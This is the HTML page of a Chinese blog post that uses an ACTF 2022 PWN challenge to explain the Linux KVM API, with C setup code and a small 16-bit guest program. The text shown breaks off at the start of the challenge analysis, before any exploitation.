@@ -1,0 +1,1482 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="从一道CTF题目学习KVM, Hexo">
+    <meta name="description" content="从一道CTF题目学习KVMKVM 全称是基于内核的虚拟机（Kernel-based Virtual Machine），它是Linux 的一个内核模块，KVM基于虚拟化扩展（Intel VT 或者 AMD-V）的 X86 硬件的开源的 Lin">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    
+
+    <title>从一道CTF题目学习KVM | Hexo</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"></head>
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/unrav31" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Follow Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/unrav31" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Follow Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/22.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">从一道CTF题目学习KVM</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/CTF/">
+                                <span class="chip bg-color">CTF</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-07-29
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    3.1k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    14 分
+                </div>
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="/libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="从一道CTF题目学习KVM"><a href="#从一道CTF题目学习KVM" class="headerlink" title="从一道CTF题目学习KVM"></a>从一道CTF题目学习KVM</h1><p>KVM 全称是基于内核的虚拟机（Kernel-based Virtual Machine），它是Linux 的一个内核模块，KVM基于虚拟化扩展（Intel VT 或者 AMD-V）的 X86 硬件的开源的 Linux 原生的全虚拟化解决方案。</p>
+<p>KVM 本身不执行任何硬件模拟，需要用户空间程序（QEMU）通过 <strong>&#x2F;dev&#x2F;kvm</strong> 接口设置一个客户机虚拟服务器的地址空间，向它提供模拟 I&#x2F;O，并将它的视频显示映射回宿主的显示屏。</p>
+<h1 id="题目逆向分析"><a href="#题目逆向分析" class="headerlink" title="题目逆向分析"></a>题目逆向分析</h1><p>题目来源于ACTF 2022的一道PWN题，给出四个文件，二进制程序在bin文件夹下，其余都是题目部署所用到的文件，可以用docker搭建题目，后面会讲到：</p>
+<pre class="line-numbers language-none"><code class="language-none">├── bin
+│   ├── mykvm
+├── ctf.xinetd
+├── Dockerfile
+└── start.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>分析二进制文件逻辑，发现代码量并不大，逻辑也很简单：</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181539182.png" alt="image-20220629181539182">在函数sub_400B92中，有很多ioctl操作 <strong>&#x2F;dev&#x2F;kvm</strong> 设备文件，但还不知道到底是请求了哪种接口实现了哪种功能：</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181615926.png" alt="image-20220629181615926">这里需要了解一下KVM的实现。</p>
+<h1 id="KVM实现"><a href="#KVM实现" class="headerlink" title="KVM实现"></a>KVM实现</h1><p>GitHub有两个简易的KVM例子供参考：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/dpw/kvm-hello-world">https://github.com/dpw/kvm-hello-world</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/kvmtool/kvmtool">https://github.com/kvmtool/kvmtool</a></p>
+<p>阅读源码后，总结出在主机创建一个KVM的基本步骤如下：</p>
+<ol>
+<li>打开KVM设备</li>
+<li>创建VM</li>
+<li>为Guest设置内存</li>
+<li>创建虚拟CPU</li>
+<li>为vCPU设置内存</li>
+<li>将汇编代码放进用户区域，设置vCPU的寄存器</li>
+<li>运行和处理退出</li>
+</ol>
+<p>下面分步骤介绍。</p>
+<h2 id="step-1-3"><a href="#step-1-3" class="headerlink" title="step 1-3"></a>step 1-3</h2><p>打开KVM设备，创建VM，设置Guest内存。实现代码如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token comment">// step 1, open /dev/kvm</span>
+  <span class="token keyword">int</span> kvmfd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/kvm"</span><span class="token punctuation">,</span> O_RDWR<span class="token operator">|</span>O_CLOEXEC<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span><span class="token punctuation">(</span>kvmfd <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> 
+    <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"failed to open /dev/kvm"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment">// step 2, create VM</span>
+  <span class="token keyword">int</span> vmfd <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>kvmfd<span class="token punctuation">,</span> KVM_CREATE_VM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment">// step 3, set up user memory region</span>
+  <span class="token class-name">size_t</span> mem_size <span class="token operator">=</span> <span class="token number">0x40000000</span><span class="token punctuation">;</span>           <span class="token comment">// size of user memory you want to assign</span>
+  <span class="token keyword">void</span> <span class="token operator">*</span>mem <span class="token operator">=</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> mem_size<span class="token punctuation">,</span> PROT_READ<span class="token operator">|</span>PROT_WRITE<span class="token punctuation">,</span>
+                   MAP_SHARED<span class="token operator">|</span>MAP_ANONYMOUS<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">int</span> user_entry <span class="token operator">=</span> <span class="token number">0x0</span><span class="token punctuation">;</span>
+  <span class="token function">memcpy</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>mem <span class="token operator">+</span> user_entry<span class="token punctuation">)</span><span class="token punctuation">,</span> code<span class="token punctuation">,</span> code_len<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">kvm_userspace_memory_region</span> region <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">.</span>slot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span>flags <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span>guest_phys_addr <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span>
+    <span class="token punctuation">.</span>memory_size <span class="token operator">=</span> mem_size<span class="token punctuation">,</span>
+    <span class="token punctuation">.</span>userspace_addr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>mem
+  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+  <span class="token function">ioctl</span><span class="token punctuation">(</span>vmfd<span class="token punctuation">,</span> KVM_SET_USER_MEMORY_REGION<span class="token punctuation">,</span> <span class="token operator">&amp;</span>region<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token comment">/* end of step 3 */</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>以上代码创建一个VM，<code>mmap</code>为VM分配0x40000000(1GB)大小，设置<code>user_entry</code>为0，将汇编放在第一页，Guest将从该地址开始执行。</p>
+<h2 id="step-4-6"><a href="#step-4-6" class="headerlink" title="step 4-6"></a>step 4-6</h2><p>创建虚拟CPU，为vCPU设置内存，将汇编代码放进用户区域。实现代码如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* step 4~6, 创建和设置 vCPU */</span>
+<span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+	<span class="token comment">/* step 1-3 ... */</span>
+  <span class="token comment">// step 4, create vCPU</span>
+  <span class="token keyword">int</span> vcpufd <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>vmfd<span class="token punctuation">,</span> KVM_CREATE_VCPU<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment">// step 5, set up memory for vCPU</span>
+  <span class="token class-name">size_t</span> vcpu_mmap_size <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>kvmfd<span class="token punctuation">,</span> KVM_GET_VCPU_MMAP_SIZE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">struct</span> <span class="token class-name">kvm_run</span><span class="token operator">*</span> run <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">kvm_run</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">mmap</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> vcpu_mmap_size<span class="token punctuation">,</span> PROT_READ <span class="token operator">|</span> PROT_WRITE<span class="token punctuation">,</span> MAP_SHARED<span class="token punctuation">,</span> vcpufd<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+  <span class="token comment">// step 6, set up vCPU's registers</span>
+  <span class="token comment">/* standard registers include general-purpose registers and flags */</span>
+  <span class="token keyword">struct</span> <span class="token class-name">kvm_regs</span> regs<span class="token punctuation">;</span>
+  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_GET_REGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>regs<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  regs<span class="token punctuation">.</span>rip <span class="token operator">=</span> user_entry<span class="token punctuation">;</span>
+  regs<span class="token punctuation">.</span>rsp <span class="token operator">=</span> <span class="token number">0x200000</span><span class="token punctuation">;</span> <span class="token comment">// stack address</span>
+  regs<span class="token punctuation">.</span>rflags <span class="token operator">=</span> <span class="token number">0x2</span><span class="token punctuation">;</span> <span class="token comment">// in x86 the 0x2 bit should always be set</span>
+  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_SET_REGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>regs<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// set registers</span>
+
+  <span class="token comment">/* special registers include segment registers */</span>
+  <span class="token keyword">struct</span> <span class="token class-name">kvm_sregs</span> sregs<span class="token punctuation">;</span>
+  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_GET_SREGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sregs<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  sregs<span class="token punctuation">.</span>cs<span class="token punctuation">.</span>base <span class="token operator">=</span> sregs<span class="token punctuation">.</span>cs<span class="token punctuation">.</span>selector <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// let base of code segment equal to zero</span>
+  <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_SET_SREGS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sregs<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token comment">// not finished ...</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>以上代码创建vCPU，设置寄存器，每个<code>kvm_run</code>结构对应一个vCPU，每个VM可创建多个vCPU。vCPU创建后执行于实模式，也就是说只能执行16位汇编代码，如果需要执行32位或64位，则还需要设置页表。</p>
+<h2 id="step-7"><a href="#step-7" class="headerlink" title="step 7"></a>step 7</h2><p>运行和处理退出。实现代码如下：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">/* step 7 */</span>
+<span class="token keyword">void</span> <span class="token function">kvm</span><span class="token punctuation">(</span><span class="token class-name">uint8_t</span> code<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span> code_len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token comment">/* ... step 1~6 */</span>
+  <span class="token comment">// step 7, execute vm and handle exit reason</span>
+  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">ioctl</span><span class="token punctuation">(</span>vcpufd<span class="token punctuation">,</span> KVM_RUN<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">switch</span> <span class="token punctuation">(</span>run<span class="token operator">-></span>exit_reason<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">case</span> KVM_EXIT_HLT<span class="token operator">:</span>
+      <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token string">"KVM_EXIT_HLT"</span><span class="token punctuation">,</span> <span class="token constant">stderr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> KVM_EXIT_IO<span class="token operator">:</span>
+      <span class="token comment">/* TODO: check port and direction here */</span>
+      <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>run<span class="token punctuation">)</span> <span class="token operator">+</span> run<span class="token operator">-></span>io<span class="token punctuation">.</span>data_offset<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+      <span class="token keyword">break</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> KVM_EXIT_FAIL_ENTRY<span class="token operator">:</span>
+      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_FAIL_ENTRY: hardware_entry_failure_reason = 0x%llx"</span><span class="token punctuation">,</span>
+        run<span class="token operator">-></span>fail_entry<span class="token punctuation">.</span>hardware_entry_failure_reason<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> KVM_EXIT_INTERNAL_ERROR<span class="token operator">:</span>
+      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_INTERNAL_ERROR: suberror = 0x%x"</span><span class="token punctuation">,</span>
+        run<span class="token operator">-></span>internal<span class="token punctuation">.</span>suberror<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">case</span> KVM_EXIT_SHUTDOWN<span class="token operator">:</span>
+      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"KVM_EXIT_SHUTDOWN"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">default</span><span class="token operator">:</span>
+      <span class="token function">errx</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">"Unhandled reason: %d"</span><span class="token punctuation">,</span> run<span class="token operator">-></span>exit_reason<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+  <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在<code>switch</code>语句中，只需要注意两种状态，即<code>KVM_EXIT_HLT</code>和<code>KVM_EXIT_IO</code>，前者由汇编指令<code>hlt</code>触发，会退出VM。后者由汇编指令<code>in/out</code>触发，把字符输出到设备。<code>ioctl(vcpufd, KVM_RUN, NULL)</code>会一直运行，直到退出（如<code>hlt</code>、<code>out</code>、<code>error</code>）</p>
+<h2 id="尝试自己的VM"><a href="#尝试自己的VM" class="headerlink" title="尝试自己的VM"></a>尝试自己的VM</h2><p>接下来我们直接写16位汇编代码，让其运行在VM的实模式下。以下是一个简单的例子，它输出一个字符“a”：</p>
+<pre class="line-numbers language-wasm" data-language="wasm"><code class="language-wasm">.code
+mov al, <span class="token number">0x61</span>
+mov dx, <span class="token number">0x217</span>
+out dx, al
+hlt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>dx</code> 寄存器赋值0x217是将内容输出到这个串行端口。将其编译成16位汇编代码，可以使用nasm，也可以使用工具网站在线汇编：</p>
+<p><a target="_blank" rel="noopener" href="http://shell-storm.org/online/Online-Assembler-and-Disassembler/?inst=&arch=x86-16&as_format=inline#assembly">shell-storm | Online Assembler and Disassembler</a></p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181659435.png" alt="image-20220629181659435"></p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">uint8_t</span> vmcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"\\xb0\\x61\\xba\\x17\\x02\\xee\\xf4"</span>
+<span class="token function">kvm</span><span class="token punctuation">(</span>code<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>执行结果（因为没有输出换行符，所以和<code>KVM_EXIT_HLT</code>连在了一起）：</p>
+<pre class="line-numbers language-none"><code class="language-none">aKVM_EXIT_HLT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h1 id="题目逆向分析-1"><a href="#题目逆向分析-1" class="headerlink" title="题目逆向分析"></a>题目逆向分析</h1><p>在了解了KVM的执行原理后，回到题目进行分析。</p>
+<p>因为KVM模块是建立在内核中的，所以知道<code>ioctl</code>的宏定义之后，可以在Linux内核源码进行搜索。以<code>KVM_RUN</code>为例，存在于源码树 <strong>&#x2F;include&#x2F;uapi&#x2F;linux&#x2F;kvm.h</strong> 头文件中，以下是搜索到的结果：</p>
+<p><img src="https://raw.githubusercontent.com/unrav31/images/master/image-20220629181711623.png" alt="image-20220629181711623">值0x80看起来和题目中的完全不同，看来是<code>_IO(KVMIO, 0x80)</code>对值进行了处理，对于这种复杂的嵌套宏定义，可以直接写一段C代码把它的值打印出来：</p>
